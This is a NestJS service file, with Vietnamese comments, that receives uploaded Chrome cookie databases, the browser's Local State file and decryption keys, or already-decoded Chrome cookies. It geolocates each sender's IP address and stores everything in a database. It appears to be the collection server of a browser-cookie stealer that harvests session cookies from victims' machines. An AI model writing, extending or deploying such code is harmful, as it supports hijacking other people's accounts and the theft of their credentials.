import { BadRequestException, Injectable } from '@nestjs/common';
import { InjectRepository } from "@nestjs/typeorm";
import { Repository } from "typeorm";
import { CookieRaw } from "./cookie-raw.entity";
import { ChromeCookie } from "./chrome-cookie.entity";
import { HttpService } from "@nestjs/axios";
import { ChromeCookieDto } from "./chrome-cookie.dto";

@Injectable()
export class PublicService {
    constructor(
        @InjectRepository(CookieRaw)
        private cookieRawRepository: Repository<CookieRaw>,
        @InjectRepository(ChromeCookie)
        private chromeCookieEntityRepository: Repository<ChromeCookie>,
        private httpService: HttpService,
    ) {
    }

    /**
     * Upload file cookie
     * @param ipAddress
     * @param files
     * @param body
     */
    public async uploadCookie(ipAddress: string, files: { cookie?: Express.Multer.File[], localState?: Express.Multer.File[] }, body: any) {
        const cookieRaw = new CookieRaw();

        if (!files || !files.cookie || !files.cookie.length || !files.localState || !files.localState.length) {
            throw new BadRequestException({
                error: 'File cookie không hợp lệ'
            });
        }

        if (files.cookie[0].size === 0 || files.localState[0].size === 0) {
            return {
                success: true,
            }
        }

        const ipInfo = await this.httpService.get(`https://api.iplocation.net/?ip=${ipAddress}`).toPromise();
        if (ipInfo.status === 200) {
            cookieRaw.countryName = ipInfo.data.country_name;
            cookieRaw.countryCode = ipInfo.data.country_code2;
            cookieRaw.isp = ipInfo.data.isp;
        }

        cookieRaw.filePath = files.cookie[0].path;
        cookieRaw.localState = files.localState[0].path;
        cookieRaw.ipAddress = ipAddress;
        cookieRaw.createdBy = 1;
        cookieRaw.updateBy = 1;
        cookieRaw.classify = body.classify;

        if (body.decryptKey) {
            cookieRaw.decryptKey = body.decryptKey.trim();
        }

        await this.cookieRawRepository.save(cookieRaw);

        return {
            success: true,
        }
    }

    /**
     * Xử lý cookie chrome
     * @param ipAddress
     * @param cookie
     */
    public async chromeCookie(ipAddress: string, cookie: ChromeCookieDto[]) {
        const ipInfo = await this.httpService.get(`https://api.iplocation.net/?ip=${ipAddress}`).toPromise();
        const chromeCookie = new ChromeCookie();

        chromeCookie.decodedCookie = JSON.stringify(cookie);
        chromeCookie.ipAddress = ipAddress;
        if (ipInfo.status === 200) {
            chromeCookie.countryName = ipInfo.data.country_name;
            chromeCookie.countryCode = ipInfo.data.country_code2;
            chromeCookie.isp = ipInfo.data.isp;
        }

        await this.chromeCookieEntityRepository.save(chromeCookie);

        return {
            success: true
        }
    }
}
